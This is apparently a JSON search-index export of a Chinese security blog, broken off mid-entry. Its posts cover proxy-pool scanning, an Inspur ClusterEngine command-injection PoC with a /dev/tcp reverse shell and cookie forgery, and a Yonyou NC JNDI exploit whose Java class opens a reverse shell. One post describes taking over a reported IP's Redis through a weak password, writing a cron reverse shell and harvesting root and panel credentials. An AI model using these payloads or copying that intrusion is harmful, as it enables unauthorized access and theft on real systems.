    "content"  : "基于scylla的代理池优点：手工burp渗透的同时，后台Xray扫描缺点：会被封IP，所以需要一个代理池或机场作为Xray的出口运行逻辑：一、ScyllaAgentPool目前在Ubuntu18、Darwin下测试成功ScyllaV1.1.7DownloadScylla中文文档2021年6月10日星期四15时56分53秒CSTWINDOWS测试环境Windows10测试排坑失败不推荐win环境下部署1x01Ubuntu&amp;Darwin➜cdscylla-1.1.7➜python3-mpipinstall-rrequirements.txt➜exporthttp_proxy=\"http://127.0.0.1:8082\";exportHTTP_PROXY=\"http://127.0.0.1:8082\";exporthttps_proxy=\"http://127.0.0.1:8082\";exportHTTPS_PROXY=\"http://127.0.0.1:8082\"#需加上科学代理，否则报错WARNING:[Worker]Cannotgetthisurl:#https://raw.githubusercontent.com/a2u/free-proxy-list/master/free-proxy-list.txt➜python3-mscylla2021-06-04-09:57:56DEBUG:createnewdbconnection2021-06-04-09:57:57INFO:Schedulerstarts...2021-06-04-09:57:57DEBUG:feed16providers...2021-06-04-09:57:57INFO:Startpythonscheduler2021-06-04-09:57:57INFO:worker_processstarted2021-06-04-09:57:57INFO:validator_threadstarted2021-06-04-09:57:57INFO:Startthewebserver[2021-06-0409:57:57+0800][3848][INFO]Goin'Fast@http://0.0.0.0:8899[2021-06-0409:57:57+0800][3848][ERROR]Unabletostartserver·········2021-06-04-10:04:20DEBUG:Getaproviderfromtheproviderqueue:ProxyNovaProvider2021-06-04-10:04:20DEBUG:Catchrequests.Timeoutforproxyip:110.76.148.2422021-06-04-10:04:21DEBUG:Catchrequests.Timeoutforproxyip:160.19.232.852021-06-04-10:04:22INFO:ProxyNovaProvider:feed0potentialproxiesintothevalidatorqueue2021-06-04-10:04:23INFO:PubproxyProvider:feed5potentialproxiesintothevalidatorqueue看到PubproxyProvider返回提供的代理ip即可用：#真实ip➜curlhttp://api.ipify.org60.168.247.60#代理池ip➜curlhttp://api.ipify.org-xhttp://127.0.0.1:808112.186.206.841x02Windows10Couldnotfindaversionthatsatisfiestherequirementpycurl==7.43.0.11、windowspip换源2、修改requirements.txtpycurl==7.43.0.53、python3-mpipinstallpycurl==7.43.0.54、python3-mpipinstall-rrequirements.txtBuildingwheelformultidict(PEP517)…error#详细报错：error:MicrosoftVisualC++14.0orgreaterisrequired.Getitwith\"MicrosoftC++BuildTools\":https://visualstudio.microsoft.com/visual-cpp-build-tools/----------------------------------------ERROR:Failedbuildingwheelformultidict安装VSC++14以上版本即可python3-mpipinstall--upgradesetuptoolsMicrosoftBuildToolsforVisualStudio2019集成开发环境(IDE)下载Community版；选择组件参考：npminstallC:\\Windows&gt;npm-v7.15.1C:\\Windows&gt;node-vv16.3.0npmERR!code1npmERR!pathC:\\Users\\bin4xin\\Desktop\\scylla\\node_modules\\deasyncnpmERR!commandfailednpmERR!commandC:\\Windows\\system32\\cmd.exe/d/s/cnode./build.jsnpmERR!gypinfoitworkedifitendswithoknpmERR!gypinfousingnode-gyp@3.8.0npmERR!gypinfousingnode@16.3.0|win32|ia32npmERR!gypERR!configureerrornpmERR!gypERR!stackError:Commandfailed:C:\\Python39\\python.EXE-cimportsys;print\"%s.%s.%s\"%sys.version_info[:3];npmERR!gypERR!stackFile\"&lt;string&gt;\",line1npmERR!gypERR!stackimportsys;print\"%s.%s.%s\"%sys.version_info[:3];看到上面的C:\\Python39\\python.EXE-cimportsys;print\"%s.%s.%s\"%sys.version_info[:3];报错，实际上正确的写法应该是：Type\"about\",\"copyright\",\"credits\"or\"license\"formoreinformation.&gt;&gt;&gt;importsys&gt;&gt;&gt;print(\"%s.%s.%s\"%sys.version_info[:3])3.8.5想到几种可能性：1、scyllapython的源码；2、npm安装源码依赖导致；顿时觉得这里面的坑深不可测我把握不住，遂放弃在windows平台搭建；由于在macosOS、Ubuntu上搭建成功，只能走曲线救国方式，在docker中尝试；BurpSuitewithAgentPoolProxyListeners-&gt;127.0.0.18081端口https://www.rmccurdy.com/.scripts/proxy/good.txtpassive-scan-client➜gitclonehttps://github.com/c0ny1/passive-scan-client➜cdpassive-scan-client➜mvnpackage➜lstarget/archive-tmpmaven-archiverpassive-scan-client-0.1.jarclassesmaven-statusgenerated-sourcespassive-scan-client-0.1-jar-with-dependencies.jarpassive-scan-client-0.1-jar-with-dependencies.jar导入BurpSuite：Extender-&gt;Extensions-&gt;Add{/path-to-taget-dir/passive-scan-client-0.1-jar-with-dependencies.jar配置转发扫描端口xraywithAgentPool扫描配置浏览器配置代理http(s)://127.0.0.1:12344BurpSuite监听12344passive-scan-client如上配置xray如下配置即可➜nohup./xraywebscan--listen127.0.0.1:7777--html-outputoutput/2021-05/2021-05-28.html&amp;➜tail-fnohup.out效果：参考burp流量转发插件PSC+xray/w13scan实现被动扫描xray+passive-scan-client配置以上。"
  },

  {
    "title"    : "浪潮ClusterEngineV4.0代码审计历程",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/",
    "date"     : "May 21, 2021",
    "content"  : "CNVD-2021-39845-浪潮ClusterEngineV4.0存在逻辑缺陷漏洞2021年5月21日星期日00时11分58秒CST最近一直在看代码，正好前两天在网上冲浪的时候看到浪潮的一个RCE，就拿过来分析一下试试看2021年5月31日星期一22时55分49秒CST上传相关代码至bigger-than-bigger仓库：点击查看相关代码先看web.xml定义的servlet；&lt;servlet&gt;&lt;servlet-name&gt;login&lt;/servlet-name&gt;&lt;servlet-class&gt;com.inspur.tsce4.login.Servlet&lt;/servlet-class&gt;&lt;/servlet&gt;指向com.inspur.tsce4.login.Servlet类，直接去看login：WEB-INF/classes/com/inspur/tsce4/login/Servlet类：publicclassServletextendsHttpServlet{publicServlet(){}publicvoiddoPost(HttpServletRequestrequest,HttpServletResponseresponse)throwsServletException,IOException{request.setCharacterEncoding(\"utf-8\");Managementmanage=newManagement(request,response);manage.doResponse();}publicvoiddoGet(HttpServletRequestrequest,HttpServletResponseresponse)throwsServletException,IOException{this.doPost(request,response);}}继承了HttpServlet，dopost方法调用Management：publicclassManagement{HttpServletRequestrequest;HttpServletResponseresponse;Commandcommand=newCommand();}我个人不太喜欢贴大段代码，自己写着累，看的人也累，因为代码只更像是我们生活中聊天时候的互动手势，一定是辅助作用而不是表达主题；于是我便大致画了一下我理解的web认证Java代码跳转逻辑，方便理解：command()-&gt;对应是运行服务器上的user_auth.sh脚本：点击以查看代码来看看代码主要运行逻辑，主要为以下逻辑：运行程序先判断传入参数个数紧接着对第一个传入参数进行简单的特殊字符过后进行比对，代码如下：unameecho$1|awk-F\"\"'{for(i=1;i&lt;=NF;i++){if($i~/[a-zA-Z0-9_]/){str=$i;str1=(str1str)}}printstr1}'if[a\"$uname\"b!=a\"$1\"b];thenechotheuser$1formatisillegalechoerror:1exit1;fi#简单做了一个过滤实验，但是一对符号如()''等都无法过滤➜echoa-d-c.\\/|awk-F\"\"'{for(i=1;i&lt;=NF;i++){if($i~/[a-zA-Z0-9_]/){str=$i;str1=(str1str)}}printstr1}'adc其中进行算法识别的代码只能在redhat系统运行，中文环境下的redhat系统crypt换成加密即可：encrypt=$(passwd-Sroot|sed-rn's/.*(\\w+)crypt.*/\\1/p')encrypt=$(passwd-Sroot|sed-rn's/.*(\\w+)加密.*/\\1/p')➜dockerrun-dhjd48/redhat➜dockerexec-itc2739bba0d86/bin/bash##redhat6国内换源bash-4.1#cd/etc/yum.repos.d/&amp;&amp;mkdirtmp&amp;&amp;mv*.repotmpbash-4.1#wget-O/etc/yum.repos.d/CentOS-Base.repohttps://static.lty.fun/%E5%85%B6%E4%BB%96%E8%B5%84%E6%BA%90/SourcesList/Centos-6-Vault-Aliyun.repo##encrypt获取过程bash-4.1#uname-aLinuxc2739bba0d865.10.25-linuxkit#1SMPTueMar2309:27:39UTC2021x86_64x86_64x86_64GNU/Linuxbash-4.1#cat/etc/issueRedHatEnterpriseLinuxServerrelease6.3(Santiago)Kernel\\ronan\\mbash-4.1#passwd-Sroot|sed-rn's/.*(\\w+)加密.*/\\1/p'SHA512##用户认证过程bash-4.1#bashuser_auth.shrootzanghun123rootarootbarootb$6$s8LxZk5w$VUlASup50b9gmquJS6BT6YhDGHwTZThCRQeXRi12bHq8gAgxhSuqO5R7Jwm6p62lEyL4na16tG21gtBV1KaOV.encrypt:SHA512s8LxZk5wpasswd_shadow:$6$s8LxZk5w$VUlASup50b9gmquJS6BT6YhDGHwTZThCRQeXRi12bHq8gAgxhSuqO5R7Jwm6p62lEyL4na16tG21gtBV1KaOV.passwd_t:$6$s8LxZk5w$VUlASup50b9gmquJS6BT6YhDGHwTZThCRQeXRi12bHq8gAgxhSuqO5R7Jwm6p62lEyL4na16tG21gtBV1KaOV.true0x01：远程代码执行用户认证的逻辑基本如此，我们可以看到在web应用层针对用户的认证就是bash代码进行用户哈希值比对的结果，是以这样的参数传入：bashuser_auth.sh$username$passwd所以就导致了RCE，原理也十分简单，我们在web层的传入$username和$passwd两个参数可控，Linux环境下对传入参数使用符号：$`()进行变量替换即可：bash-4.1#cdtouch-test/bash-4.1#lsbash-4.1#pwd/tmp/touch-testbash-4.1#$(touchid)bash-4.1#lsidbash-4.1#$(id)bash:uid=0(root):commandnotfound所以传入参数进行RCE即可；poc代码：#POC测试(出现root:x:0:0则存在漏洞)op=login&amp;username=peiqi`$(cat/etc/passwd)`{\"err\":\"/bin/sh:root:x:0:0:root:/root:/bin/bash:Nosuchfileordirectory\\n\",\"exitcode\":1,\"out\":\"theuserpeiqidoesnotexist\\nerror:1\\n\"}#反弹shellop=login&amp;username=peiqi`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)`参考浪潮ClusterEngineV4.0任意命令执行0x02：Cookie伪造登录com.inspur.tsce4.Management.login()-Management.getCookie()-Management.loginOut()publicclassManagement{privatevoidgetCookie(){Stringkey=this.request.getParameter(\"name\");JSONObjectresult=newJSONObject();Cookie[]cookies=this.request.getCookies();Cookiecookie=null;CookieuserCookie=null;CookieL_TIMES_cookie=null;if(cookies!=null){for(inti=0;i&lt;cookies.length;++i){if(cookies[i].getName().equals(key)){cookie=cookies[i];}elseif(cookies[i].getName().equals(\"username\")){userCookie=cookies[i];}elseif(cookies[i].getName().equals(\"L_TIMES\")){L_TIMES_cookie=cookies[i];}}}if(userCookie==null&amp;&amp;key.equals(\"username\")){userCookie=cookie;}if(clearUserList.containsKey(userCookie.getValue())&amp;&amp;userCookie!=null&amp;&amp;key.equals(\"vertifyUser\")){Longnow=(newDate()).getTime();LongaddTime=((Date)clearUserList.get(userCookie.getValue())).getTime();if(now-addTime&gt;43200000L){clearUserList.remove(userCookie.getValue());}elseif(addTime-Long.parseLong(L_TIMES_cookie.getValue())&gt;0L){CookiecookieAuth=newCookie(\"vertifyUser\",\"false\");cookieAuth.setMaxAge(43200);cookieAuth.setPath(\"/\");cookieAuth.setHttpOnly(true);this.response.addCookie(cookieAuth);cookie=null;}}try{if(cookie!=null){result.put(\"result\",\"true\");result.put(\"value\",cookie.getValue());}else{result.put(\"result\",\"false\");}JsonUtil.respnseJson(this.response,result.toString());}catch(JSONExceptionvar10){JsonUtil.respnseJson(this.response,this.nullResJson.toString());}}}分析得：用户认证Cookie不存在随机性、时效性。所以我们可以直接伪造Cookie登入即可：lang=cn;username=root;userType=administrator;vertifyUser=true直接使用Cookie插件ModHeader带入Cookie，直接登入：以上。"
  },

  {
    "title"    : "通达OA利用代码分析",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/ToDa-OA-VulnPoc-by-java-analysis/",
    "date"     : "May 19, 2021",
    "content"  : "通达OA利用代码分析main()//Main.javapublicclassMain{publicstaticvoidmain(String[]args){newTDOAFrame();}}⌘command+左键单击TDOAFrame跳转//TDOAFrame.javaimportjavax.swing.*;importjava.awt.*;publicclassTDOAFrameextendsJFrame{}/*TDOAFrame继承Jframe，画出GUI对应按钮等*JLabeljLabel=newJLabel(\"目标地址:\");*JTextFieldfield_url=newJTextField(\"http://192.168.238.141\",45);*继续往下初始化Jbutton*JButtonbutton=newJButton(\"获取Cookie\");*JButtonbutton2=newJButton(\"一键利用\");*给button\"获取Cookie\"按钮绑定事件*给Button2\"一键利用\"按钮绑定事件*/publicclassTDOAFrameextendsJFrame{publicTDOAFrame(Stringtitle){button.addActionListener(newGetCookieActionListener(field_url,field_cookie,textArea));button2.addActionListener(newGetShellActionListener(field_url,field_cookie,jcomboBox,textArea));}}同样的，我们通过初始化按钮监听器，传入对应按钮所对应的参数，如：GetCookieActionListener(field_url,field_cookie,textArea)&amp;GetShellActionListener(field_url,field_cookie,jcomboBox,textArea)即：button获取cookie获取用户输入的field_url,field_cookie输入到textArea紧接着button利用按钮点击触发获取field_url,field_cookie,jcomboBox，将最终结果输出到textArea，但我们从图形界面来看，两个文本域应该不是同一个域，实际上我也很奇怪这一点。紧接着，继续⌘command+左键单击GetCookieActionListener跳转privateJTextFieldfield_url;//目标地址privateJTextFieldfield_cookie;//Cookie//privateJComboBoxjcomboBox;GetShellActionListener利用方式显示privateTextAreatextArea;//多行文本框,显示程序运行状态GetCookieActionListener是对应按钮监听功能，与其相同的还有GetShellActionListener，主方法分析完毕后，操作逻辑就是这两个按钮的操作逻辑，具体工作逻辑如下：Step1跑完后跳至Step2，最后Step3；美化:D[Updating…]BeautyEyeGUI美化http://www.52im.net/thread-26-1-1.htmlhttp://www.52im.net/extend/docs/api/beautyeyev3/index.html?overview-tree.htmlhttp://www.52im.net/extend/docs/api/beautyeyev3/serialized-form.html#org.jb2011.lnf.beautyeye.ch1_titlepane.BETitlePane美化前：美化后："
  },

  {
    "title"    : "基于Modbus协议与KingView实现Openplc仿真通讯",
    "category" : "",
    "tags"     : "漏洞复现, 笔记",
    "url"      : "/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-I/",
    "date"     : "May 7, 2021",
    "content"  : "#仿真通讯靶场搭建基于Modbus协议与KingView实现Openplc仿真通讯-通讯靶场网络示意图如下#OpenPLConLinuxOpenPLC环境搭建点击以了解OpenPLC$mkdirICWR&amp;&amp;cdICWR$gitclonehttps://github.com/thiagoralves/OpenPLC_v3.git$cdOpenPLC_v3$./install.shlinux·········CompilingforLinuxGeneratingobjectfiles...GeneratingglueVars...Compilingmainprogram...Compilationfinishedsuccessfully!运行：nohup./start_openplc.sh&amp;OpenPLC_EditoronLinux作用为本地PLC程序调试使用，无需求可跳过$gitclonehttps://github.com/thiagoralves/OpenPLC_Editor.git$cdOpenPLC_Editor$./install.sh$./openplc_editor.sh#OpenPLCPrograms$curl-oopenplc_test.sthttps://raw.githubusercontent.com/sxd0216/openplc_test.st/master/openplc_test.st#KingviewonWindows设备驱动-&gt;PLC-&gt;莫迪康-&gt;ModBUSTCP-&gt;TCP-&gt;下一步：文件-&gt;画面添加组件（可参考动图添加组件）数据库-&gt;数据字典-&gt;新建…选中自定义画面-&gt;make-&gt;view（GIF动画有点大，loading…）：#靶场攻击流量分析#WireShark流量分析网上已经有大佬上传wireshark流量文件，就不重复造轮子去流量了，直接下载下来对照poc代码分析看看：点击下载：sxd0216/attack-packets14、16帧为client向server请求流量，具体如下图：15、17帧为server返回给client确认流量，具体流量可自行下载分析#模拟攻击启停"
  },

  {
    "title"    : "用友NC6.5java反序列化",
    "category" : "",
    "tags"     : "反序列化",
    "url"      : "/blog/2021/yonyou-java-underser/",
    "date"     : "Mar 13, 2021",
    "content"  : "零：用友nc6.5反序列化依赖jar包0x01：攻击java代码importnc.bs.framework.common.NCLocator;importjava.util.Properties;publicclasspoc{publicstaticvoidattack(Stringurl,Stringjndipath){Propertiesenv=newProperties();if(!url.startsWith(\"http\")){url=\"http://\"+url;}env.put(\"SERVICEDISPATCH_URL\",url+\"/ServiceDispatcherServlet\");NCLocatorlocator=NCLocator.getInstance(env);locator.lookup(jndipath);}publicstaticvoidmain(String[]args){attack(\"http://192.168.1.1:81\",\"ldap://192.168.1.2:1099/remote\");}}运行起来主要报classNotFound，必需第三方jar包如下：ncdepend.jarlog4j-1.2.15.jarlog.jar部分依赖jar包在安装完nc6.5系统后，一般在C://yonyou//home//lib//目录下，前提需要有nc6.5的安装包；或者下载仓库内的依赖包：点击以了解yonyou-nc6.5-lib本机运行环境javaversion\"1.8.0_181\"Java(TM)SERuntimeEnvironment(build1.8.0_181-b13)JavaHotSpot(TM)64-BitServerVM(build25.181-b13,mixedmode)javac1.8.0_181学习教程README下载单jar包：点击ncdepend.jar链接-&gt;Download.整包yonyou-NCv6.5-lib.zip链接-&gt;单击链接下载[anonymous]DEBUG-Invokenc.bs.framework.server.RemoteMetaContext.lookupwriteinfotoserverspendtime:188Exceptioninthread\"main\"nc.bs.framework.exception.FrameworkIOException:Remoterequesterror0x02：远程利用java恶意代码importjavax.naming.Context;importjavax.naming.Name;importjavax.naming.spi.ObjectFactory;importjava.io.Serializable;importjava.util.Hashtable;publicclassremoteimplementsObjectFactory,Serializable{publicremote(){try{java.lang.Runtime.getRuntime().exec(newString[]{\"/bin/sh\",\"-c\",\"sh-i&gt;&amp;/dev/tcp/ip/port0&gt;&amp;1\"});}catch(Exceptione){e.printStackTrace();}}@OverridepublicObjectgetObjectInstance(Objectobj,Namename,ContextnameCtx,Hashtable&lt;?,?&gt;environment)throwsException{returnnull;}}0x03：使用方法JetbrainsIDEA：file-&gt;New-&gt;Project-&gt;Java点击以了解IDEA运行JAVA项目DEMOsrc目录-&gt;New-&gt;JavaClass-&gt;poc.java即可；ProjectStructure-&gt;Librabries-&gt;+添加lib文件夹即可；恶意LDAP：java-cpmarshalsec-0.0.3-SNAPSHOT-all.jarmarshalsec.jndi.LDAPRefServer\"http://192.168.1.2:8000/#remote\"1099点击以了解marshalsecHTTPSERVER(remote.class)：python3-mhttp.server填入主方法下attckurl&amp;jndipath-&gt;runpoc.main()即可。enjoy.0x04：参考链接用友NC反序列化简单分析用友nc6.5详细安装过程"
  },

  {
    "title"    : "CST 2021年 4月14日 星期三：一次朔源事件的记录",
    "category" : "",
    "tags"     : "主动防御, 信息搜集",
    "url"      : "/blog/2021/find-source-in-cyber/",
    "date"     : "Mar 13, 2021",
    "content"  : "《Bin4xin：我的网安从业朔源事件记录》零：起源一日，某护网红队支撑群里发了一份朔源报告，鸦雀无声甲方：小伙伴们接集团要求需对WAF全流量平台攻击ip进行朔源…废佬：这…（甲方你真可爱）领导1：溯源到攻击端信息是个新的领域，望小伙伴们通过此次集团安排做些尝试性学习和探索，落实外部可借力工具和资源，[@Bin4xin废佬]也加入此次探索学习中。废佬：这…（领导你真可爱）领导2：文件：《全流量、WAF4月8日-4月12日攻击IP(1).xlsx》$more全流量、WAF4月8日-4月12日攻击IP\\(1\\).csv223.214.211.4636.59.38.115$more全流量、WAF4月8日-4月12日攻击IP\\(1\\).csv|wc-l16570废佬：这…（领导你真可爱）于是废佬就开始了愉快boring的朔源之旅一：上午、欢乐时光&amp;fofa安全工程师鲁迅：不会朔源的fofa安全工程师不是一个好的信息安全工程师#1x01：awk、split&amp;linux步入主题之前，先对这些文件进行一些简单的操作：$split-l300全流量、WAF4月8日-4月12日攻击IP\\(1\\).csvips_preview_by300_$catips_preview_by300_aa|wc-l300$lltotal1400drwxr-xr-x59bin4xinstaff188841420:48./drwxr-xr-x+43bin4xinstaff137641420:45../-rw-r--r--1bin4xinstaff454841420:48ips_preview_by300_aa-rw-r--r--1bin4xinstaff445741420:48ips_preview_by300_ab-rw-r--r--1bin4xinstaff448141420:48ips_preview_by300_ac···这样我们就有了若干个300行ip的小文件，更方便我们筛选我们需要的ip，NEXT。justfofa：#1x02：SomethingInteresting点击以了解fofa安全工程师们与微步安全工程师们欢乐而又短暂的上午如白驹过隙，一晃而过。二：下午、枯燥时光&amp;渗透测试工程师#2x01：nmap、nc&amp;linuxshell终于：发现了一些有趣的：PORTSTATESERVICEVERSION22/tcpopensshOpenSSH6.6.1(protocol2.0)|ssh-hostkey:|2048fe:03:b9:0b:7b:ab:3f:bf:cd:60:93:57:52:4e:a6:c5(RSA)|2569d:97:b5:fb:db:92:ed:a7:e3:dd:f9:5f:86:b5:e3:b4(ECDSA)|_2567b:65:cf:48:84:15:82:ca:be:46:3c:cf:93:63:07:f1(ED25519)80/tcpopenhttpnginx|http-ls:Volume/|SIZETIMEFILENAME|-24-Feb-202113:21admin/|-24-Feb-202109:27redis/|-24-Aug-201704:55staragent/|-24-Feb-202108:44www/|-24-Feb-202108:44www/htdocs/|-13-Apr-202119:44www/logs/|_|http-methods:|_SupportedMethods:GETHEADPOST|_http-title:Indexof/888/tcpopenhttpnginx|http-methods:|_SupportedMethods:GETHEADPOST|_http-title:404NotFound3306/tcpopenmysqlMySQL5.5.62-log6379/tcpopenredisRediskey-valuestore8080/tcpopenhttpApacheTomcat8.5.63|_http-favicon:ApacheTomcat|http-methods:|_SupportedMethods:GETHEADPOST|_http-title:ApacheTomcat/8.5.638888/tcpopenhttpAjentihttpcontrolpanel事实上：这是一个宝塔面板，8888+888端口；另一个事实是：这个被WAF报成4月8日-4月12日攻击IP的IP，mysql&amp;redis均为弱口令。点击更多以了解redis渗透$./redis-cli-hredis_target_ipredis_target_ip:6379&gt;getkey(error)NOAUTHAuthenticationrequired.redis_target_ip:6379&gt;redis_target_ip:6379&gt;auth123456OKredis_target_ip:6379&gt;getkey(nil)redis_target_ip:6379&gt;setxx\"\\n*****bash-i&gt;&amp;/dev/tcp/your_vps_target/port0&gt;&amp;1\\n\"OKredis_target_ip:6379&gt;configsetdir/var/spool/cron/OKredis_target_ip:6379&gt;configsetdbfilenamerootOKredis_target_ip:6379&gt;saveOKredis_target_ip:6379&gt;quit#2x02：bash、Informationgathering&amp;Traceabilityincident于是我们通过上面步骤获得了服务器权限；awesome?nextmoreawesome.通过在服务器的信息搜集，似乎看到了19年刚刚接触服务器的自己，没有任何嘲讽的意思，所有人都是初学者过来的；NOOFFENCE:-)Thanks更加了解linux和linux面板，否则就会显得十分业余，不管你是Development,operationandmaintenanceorsecuritypractitioners；匮乏的linux知识导致的过多ssh连接：ps-ef|grepssh|wc-l50错乱的终端与数据库命令运行：$cat/home/admin/.bash_historysudogrepwordpress_admin_passwd/root/env.txt/usr/local/mysql/bin/mysql-uroot-p123456sudosurooesudosurootsudogrepmysql_root_passwd/root/env.txtmysqlaliasmysql=/usr/local/mysql/bin/mysqlmysqlfind/-namemysql.socksudogrepmysql_root_passwd/root/env.txtmsyqlsudosurootgrantallprivilegeson*.*to'root'@'%'identifiedby'pass-hidden';grantallprivilegeson*.*to'root'@'%'identifiedby'123456';错误的linux权限分配：$ps-ef|greprootroot796310Mar06?00:39:39/usr/bin/java-Djava.util.logging.config.file=/www/server/apache-tomcat-8.5.63/conf/logging.properties-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager-Djdk.tls.ephemeralDHKeySize=2048-Djava.protocol.handler.pkgs=org.apache.catalina.webresources-Dorg.apache.catalina.security.SecurityListener.UMASK=0027-Dignore.endorsed.dirs=-classpath/www/server/apache-tomcat-8.5.63/bin/bootstrap.jar:/www/server/apache-tomcat-8.5.63/bin/tomcat-juli.jar-Dcatalina.base=/www/server/apache-tomcat-8.5.63-Dcatalina.home=/www/server/apache-tomcat-8.5.63-Djava.io.tmpdir=/www/server/apache-tomcat-8.5.63/temporg.apache.catalina.startup.Bootstrapstartroot2301710Mar06?00:00:00nginx:masterprocessnginx-cconf/nginx.confroot2780310Feb25?01:17:18./redis-server*:6379···同样的：通过history找到面板管理密码；tools.pyformBTpanel：$cat/root/.bash_history|greptoolscd/www/server/panel&amp;&amp;pythontools.pypanelpass-hidden$cat/www/server/panel/tools.pyif__name__==\"__main__\":type=sys.argv[1]iftype=='root':set_mysql_root(sys.argv[2])eliftype=='panel':set_panel_pwd(sys.argv[2])所以，panel模式下对应的是面板密码设置；至此，我们获得了root、redis、mysql、BTpanel；而本文并炫技，我们的初衷是朔源：mysql：数据库仅仅是存放论坛系统管理的信息及测试信息；redis：配合mysql，不必多说；BTpanel：www、ftp、sql等配置均为简单配置，没有参考价值。三：总结1、本篇文章的存在意为信息搜集、朔源方向上的抛砖引玉，文笔不佳；2、结合#2x01及#2x02小结通篇结束并未发现攻击迹象、痕迹；3、为何被报为攻击IP不得而知。以上。"
  },

  {
    "title"    : "辛丑·本命年 年后的一些思考",
    "category" : "",
    "tags"     : "笔记",
    "url"      : "/blog/2021/thereis-something2say/",
    "date"     : "Mar 13, 2021",
    "content"  : "过完年回合肥已经接近一个月之久了，今年是本命年，也希望自己能够能够比20年更加努力。回了公司就按照计划忙些有意义的：一切正在有条不紊的进行着：按照新年的规划，过来需要沉淀的便是Shiro框架。过完年回来就面临着护网，在20年靠着这个为公司护网“打下了一片江山”，今年应进一步理解；说些没用的：过年回来后，忙里偷闲与学校网安实验室的孩子们开了一次线下交流会，交流会的主要内容就是总结寒假以来的学习过程和心得汇报；因为年纪较小，基本都是刚大一、大二，所以偶尔也要进行大学生活困扰的解惑；网安实验室队伍安排：导师：队伍灵魂；我的角色：我想，我在这个队伍里扮演的角色应该是作为行业“过来人”对他们的学习计划进行有效的监督和建议。攻击队伍（红队）要求：1.熟悉各种漏洞特征和利用原理；2.能够基本读懂POC代码所进行的操作，并自己有一定的编程能力和代码审计能力；3.熟悉市面主流WAF的识别、WAF规则探测、绕过以及攻击WAF后的资产。防守队伍（蓝队）要求：1.熟悉各类漏洞形成原因、及时跟进互联网上爆出的各种0day、1day、Nday，并对频繁爆出漏洞的组件有深刻的理解，如WebLogic反序列化、Shiro反序列化、各种（SQL、模版）注入等等；2.熟悉主流操作系统Linux、Windows的工作原理如软件编译安装能力、集群的独立运维能力以及安全事件朔源能力；3.能够做到独立部署安全（审计）平台或安全工具，如WAF以及WAF工作涉及的规则库编写。数据挖掘类，涉及到算法应用等；不多说。开发类；不多说。现存问题如下：如何在现阶段的网安环境下，打造出一支专业化团队：|__1、网安实验室是否能够成立CTF战队？|__2、企业安全专业化安全服务团队？问题1、针对夺旗战队，我想：当下的拥有的资源便是最好的机会：能够有本专业导师的指导同时，有一定生源来进行夺旗比赛选取队长来保证战队的凝聚力和团队活力；管理团队应当采取比赛军事化管理；包括晨跑、内部攻防训练赛生源的匹配问题：在生源筛选时存在的问题：或许在实验室的生源选择中，应当让所有有该行业兴趣的新生都加入进来，我始终相信的是，大学生活是自身兴趣的发掘过程，对他们的培养过程同时也是考核过程；因为当下存在的问题较为明显。部分年轻新生，无法在团队的带跑下跟上节奏，踢出；小部分自身问题产生各种问题"
  },

  {
    "title"    : "安全与开发之：Maven构建排错",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/ALL-mvn-build-errors/",
    "date"     : "Mar 10, 2021",
    "content"  : "安全与开发之：Maven构建排错零：Ysoserial魔改项目Bythreedr3am.Maven构建最近在研究内存马；有幸生于信息爆炸的时代，我们可以通过搜索引擎搜索到需要的资料。2021年3月31日星期三10时22分20秒CST在原仓库中：originhttps://github.com/threedr3am/ysoserial.git(fetch)originhttps://github.com/threedr3am/ysoserial.git(push)克隆下来的项目无法构建成功；经过排错现push仓库上线。感谢@threedr3am师傅开源的代码；进一步了解排错步骤吾辈当砥砺前行；进一步了解关于内存马的开源项目0x01：[ERROR]错误:找不到符号#站在巨人的肩膀上gitclonehttps://github.com/threedr3am/ysoserial.gitcdysoserial#根据readme.md提示进行命令构建#RequiresJava1.7+andMaven3.x+mvncleanpackage-DskipTests不出意外的话，等下载完pom文件中的所有依赖，就会报错构建失败：[ERROR]COMPILATIONERROR:[INFO]-------------------------------------------------------------[ERROR]/Users/bin4xin/tools/bin4xin/code/tomcat/ysoserial/ysoserial-failed/src/main/java/ysoserial/payloads/FileUpload1.java:[11,35]错误:找不到符号[ERROR]符号:类DeferredFileOutputStream位置:程序包org.apache.commons.io.output/Users/bin4xin/tools/bin4xin/code/tomcat/ysoserial/ysoserial-failed/src/main/java/ysoserial/payloads/FileUpload1.java:[12,35]错误:找不到符号一般来说，mvn构建项目报错排错流程如下：1、源码调用的依赖库：我们可以从上面的报错看出报错的文件src/main/java/ysoserial/payloads/FileUpload1.java和依赖包名称org.apache.commons.io.output，直接定位到该文件位置查看：如上，添加依赖；提示报错是在org.apache.commons.io.output下的调用包，右边还有源码调用存在问题，看到这样的情况不要慌，IDEA给我们提供了解决方案：快捷键shift+option+enter；或悬浮鼠标在缺失的、爆红的依赖程序包上如org.apache.commons.io.output-&gt;AddMavenDependency呼出右边功能框「MavenArtifactSearch」添加上依赖后就OK了，但是还是无法构建成功；当Maven执行一个带有子模块的项目的时候，Maven首先载入父POM,然后定位所有的子模块POM。Maven然后将所有这些项目的POM放入到一个称为Maven反应堆（Reactor）的东西中，由它负责分析模块之间的依赖关系，以确保相互独立的模块能以适当的顺序被编译和安装所以继续往下来看POM：2、POM文件依赖：POM(ProjectObjectModel，项目对象模型)是Maven工程的基本工作单元，是一个XML文件，包含了项目的基本信息，用于描述项目如何构建，声明项目依赖，等等。执行任务或目标时，Maven会在当前目录中查找POM。它读取POM，获取所需的配置信息，然后执行目标。POM中可以指定以下配置：-项目依赖-插件-执行目标-项目构建profile-项目版本-项目开发者列表-相关邮件列表信息我们定位到项目的pom.xml文件，看看报错pom与成功pom对比：我们也同样可以看到，左边pom文件一片爆红；来尝试解决以下：解决方法：一般标签爆红的，解决办法都是去maven仓库里去查看对应依赖的版本号，查到对应的maven仓库的版本号修改即可；进入AliMavensearch进一步了解如果标签内整个依赖出现爆红错误，一般是尝试去在IDEA里尝试导入lib库查看是否继续报错，如果无法成功的话需要自己手动导入jar包。#再次构建mvnclean-DskipTestsmvncleanpackage-DskipTests···ls-latargettotal119144drwxr-xr-x11bin4xinstaff35233109:56.drwxrwxr-x@18bin4xinstaff57633109:56..drwxr-xr-x2bin4xinstaff6433109:56archive-tmpdrwxr-xr-x3bin4xi